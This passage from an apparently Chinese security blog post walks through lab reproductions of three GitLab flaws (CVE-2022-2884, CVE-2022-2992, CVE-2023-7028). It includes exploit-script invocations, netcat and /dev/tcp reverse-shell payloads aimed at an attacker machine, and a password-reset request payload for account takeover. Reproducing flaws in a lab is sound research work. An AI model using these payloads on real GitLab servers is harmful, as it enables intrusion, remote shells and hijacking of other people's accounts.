![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcUdGSUiaZfesGAecWBYEnzO1GLg9dDC4EqAyI2dVGaGr8MNzmMqlwrsg/640?wx_fmt=png&from=appmsg "")  
  
大约过了2～3分钟后，恶意vps上收到目标机器的shell：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcaFkB3rSyobnPMx0JeI4dtUhewzpYQ6iaelGjop4nDyAEFASOZoITibUg/640?wx_fmt=png&from=appmsg "")  
## 0x09 Octokit 授权API端点RCE（CVE-2022-2884）  
### 一、漏洞描述  
  
在11.3.4 <= GitLab CE/EE < 15.1.5、15.2 <= GitLab CE/EE < 15.2.3、15.3 <= GitLab CE/EE < 15.3.1版本中，允许经过身份验证的用户通过从 GitHub 导入 API 端点实现远程代码执行。  
  
hackone报告：  
  
https://hackerone.com/reports/1672388  
### 二、环境搭建  
  
使用15.2.2版本进行复现  
```
sudo docker pull gitlab/gitlab-ce:15.2.2-ce.0
sudo docker run -it -p 443:443 -p 80:80 -p 222:22 --network="host" -d image_id
sudo docker exec -it contaier_id grep 'Password:' /etc/gitlab/initial_root_password //查看root账户初始密码
```  
  
访问http://ip/admin/application_settings/network选择Outbound requests修改如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKc59pCnQkkGrHYRPOMYL57uuLMe3DNUMNxEvhdhU4gxpcHTqFONbHicPA/640?wx_fmt=png&from=appmsg "")  
  
这一步是为了gitlab服务器能够访问内网的攻击机，在内网复现此漏洞。  
  
最后使用root用户创建一个普通用户test，登录普通用户test生成一个具有api scope的access token  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcVuDysn2v8SBfJEJdNaB1yialLq1G605jDSZuL9zEoHicuRa1C8aB5DEA/640?wx_fmt=png&from=appmsg "")  
### 三、漏洞复现  
  
漏洞分析参考：  
https://ibukifalling.github.io/2023/01/02/cve-2022-2884/  
  
脚本地址：  
https://github.com/m3ssap0/gitlab_rce_cve-2022-2884  
```
git clone https://github.com/m3ssap0/gitlab_rce_cve-2022-2884.git
cd gitlab_rce_cve-2022-2884
pip3 install -r requirements.txt
python3 gitlab_rce_cve-2022-2884.py -u http://10.211.55.5 -pt "d9hBQvQPVrTv13M6DSZK" -tn test -a 10.211.55.3 -p 2345 -c "nc 10.211.55.3 9999 -e /bin/bash"
```  
  
攻击机上收到目标机请求：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcdbJibJI2BQUqUPKrmxibK03zVX7yM9efodlf5AaXaFYNAWBPWePUFs3A/640?wx_fmt=png&from=appmsg "")  
  
getshell：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcM5t3MICmfPwYc8G82ibvPwicias5hnLOVMqRZ1TXaxiaibvRuhR1ho2GDiaQ/640?wx_fmt=png&from=appmsg "")  
## 0x10 授权API端点 ruby 反序列化RCE（CVE-2022-2992）  
### 一、漏洞描述  
  
在11.10.0 <= GitLab CE/EE < 15.1.6、15.2.0 <= GitLab CE/EE < 15.2.4、15.3.0 <= GitLab CE/EE < 15.3.2版本中，允许经过身份验证的用户通过从 GitHub API 端点导入实现远程代码执行。  
  
hackone报告：  
  
https://hackerone.com/reports/1679624  
### 二、环境搭建  
  
使用上面的15.2.2版本进行复现  
  
与上面不同的是这次生成一个具有所有scope的access token  
### 三、漏洞复现  
  
gadget分析：  
https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html  
  
脚本地址：  
https://github.com/CsEnox/CVE-2022-2992  
#### 安装攻击机环境  
##### 1.安装ngrok  
  
首先到ngrok官网进行注册  
https://dashboard.ngrok.com/signup  
，注册好后到下面这个页面根据提示进行下载安装即可：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcttIuM5fYUmPaQZwg7cxwpwVTClFJuByLzmStAmGEmnbseR0A8XRqqQ/640?wx_fmt=png&from=appmsg "")  
  
安装完获取自己的Authtoken，就可以启动了：  
```
ngrok config add-authtoken $YOUR_AUTHTOKEN
ngrok http 10.211.55.3:5000
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcMA1UtPKmqZfFzg9sSMicO8ZGsH0HZrGgRue9rlJsBEzkQnCr3lhQCzA/640?wx_fmt=png&from=appmsg "")  
##### 2.安装ruby  
  
我这里采用rbenv安装指定版本ruby，因为最新版本运行脚本会报错（狗头）  
```
//下载rbenv工具
git clone https://github.com/rbenv/rbenv.git ~/.rbenv  

//将 rbenv 添加到环境变量
echo 'export PATH="$HOME/.rbenv/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(rbenv init -)"' >> ~/.bashrc
source ~/.bashrc

//安装 ruby-build 工具，可用它来安装指定版本ruby
git clone https://github.com/rbenv/ruby-build.git ~/.rbenv/plugins/ruby-build

//测试了2.7.5和3.0.0版本均能复现成功
rbenv install 3.0.0

//设置为全局版本
rbenv global 3.0.0

//安装redis
gem install redis
```  
#### 进行攻击  
```
//生成payload
ruby payload_gen.rb 'bash -c "bash -i >& /dev/tcp/10.211.55.3/6789 0>&1"'

//修改server.py，填入payload和ngrok地址即可
vim servery.py

//运行exploit.py
python3 exploit.py -a gitlab_token -u ngrok_url -t http://10.211.55.5
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcHHMVNBT9fVAnTHic7Xia01AkxqAyliaRibZzicy44oUMX5MbnyysBqqjmrg/640?wx_fmt=png&from=appmsg "")  
  
ngrok收到请求：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcvWhn6sZicXfZwWpSE09841BPGibO8KkG3XOeIhGmPoJqrA0oMHUF89Vw/640?wx_fmt=png&from=appmsg "")  
  
server端：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcAZVktVURia5hokQVkiaNbONhAxqibMfNkswMI816tboIslKUHic5gIgIzg/640?wx_fmt=png&from=appmsg "")  
  
getshell：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcicQNLvNGlOFTOUAR4YJ8QDtG3N2DxHqAA9bffW0A48ibwkNfnib1l1yVw/640?wx_fmt=png&from=appmsg "")  
  
**注：**  
ngrok的作用是即使gitlab在公网，我们也可以在内网运行攻击脚本，内网复现时无需修改配置使gitlab服务能够访问内网。复现0x08时我们是修改了配置才使得gitlab服务能够访问内网，才能够在内网进行复现，修改下0x08的利用脚本加入ngrok，则不必修改配置就能在内网进行复现。  
## 0x11 任意用户密码重置漏洞（CVE-2023-7028）  
### 一、漏洞描述  
  
GitLab CE/EE 中支持用户通过辅助电子邮件地址重置密码，由于电子邮件验证过程中存在错误，用户帐户密码重置电子邮件可以发送到未经验证的电子邮件地址，可能导致在无需用户交互的情况下通过密码重置进行帐户接管。  
  
影响版本：  
  
16.1 <= Gitlab < 16.1.6  
16.2 <= Gitlab < 16.2.9  
16.3 <= Gitlab < 16.3.7  
16.4 <= Gitlab < 16.4.5  
16.5 <= Gitlab < 16.5.6  
16.6 <= Gitlab < 16.6.4  
16.7 <= Gitlab < 16.7.2  
  
该漏洞的代码分析请看：  
  
https://forum.butian.net/share/2725  
### 二、环境搭建  
  
使用16.6.2版本进行复现  
```
sudo docker pull gitlab/gitlab-ce:16.6.2-ce.0
sudo docker run -it -p 443:443 -p 80:80 -p 222:22 -d image_id
sudo docker exec -it container_id /bin/bash  //进入容器
cat /etc/gitlab/initial_root_password  //查看root初始密码
```  
  
漏洞环境搭建参考：  
  
https://www.freebuf.com/vuls/389702.html  
  
此处不赘述，唯一需要说明的是smtp的配置：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcjht0FavBnAaCbrFZgfZInHH5LkIo2hNthy0fIH9vDLMD7hYY6TqrGw/640?wx_fmt=png&from=appmsg "")  
  
新注册一个用户test，邮箱为15xxxxxxx@163.com，登录root用户，激活账户：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcEPz4ich0PYYlZ8lQVqATqNMTWibpUUYVhrMSekBnKcqHOTuJ0wW1Pffg/640?wx_fmt=png&from=appmsg "")  
### 三、漏洞复现  
  
到登录页面，点击忘记密码，填入受害者邮箱，抓包，将邮箱修改为user[email][]=15xxxx@163.com&user[email][]=b.com  
：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKckMnKR3BQjMNicvic7JibibUutWPJal1bEPoGjLMwnUib5Dd26hnegh90U0w/640?wx_fmt=png&from=appmsg "")  
  
此时gitlab会向受害者邮箱和黑客邮箱发送同样的重置链接：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcVRsMmyeCDKa1RUpNZSCkAS4xQBYbyldqnZyd7qtZlnRppMLFCibXNNA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcCBn4gZrX9qcagJwEHLpLesF98akWNWf3grmM2jK50ibkqaxDibJCpflg/640?wx_fmt=png&from=appmsg "")  
  
成功更改密码：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKc6jiak2rZiaJlbTNb7l8Gm0Dlaqy7wNiacJLTUiawRFRtOX1LyHOwLwOiaug/640?wx_fmt=png&from=appmsg "")  
  
但在修改成功后，受害者邮箱会收到这样的提示：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKc3esVGzkViaV1sX0cPqaDnfKwPxnE4icOEofTDl6BCS9O7LBWsTqax39A/640?wx_fmt=png&from=appmsg "")  
  
上面的手工复现有些繁琐，可用脚本一键梭哈：  
  
https://github.com/Vozec/CVE-2023-7028  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcp99JRP8jUGsqLMUvcRIgPVUNiaH7xsGiaiciaX8S5ssz62PKUcU5tkPx4g/640?wx_fmt=png&from=appmsg "")  
  
总结  
  
本文汇总了gitlab从2016到2023年的一些常见漏洞，时间跨度较大，整理漏洞、环境搭建和复现这个过程花了不少时间，主要是为了方便自己在今后遇到了可以快速查阅相关payload和利用脚本，节省时间。由于个人水平极其有限，如有遗漏和不足之处，欢迎各位师傅补充和指正（抱拳）。  
  
  
如果喜欢小编的文章，记得多多转发，点赞+关注支持一下哦~，您的点赞和支持是我最大的动力~  
  
   
  
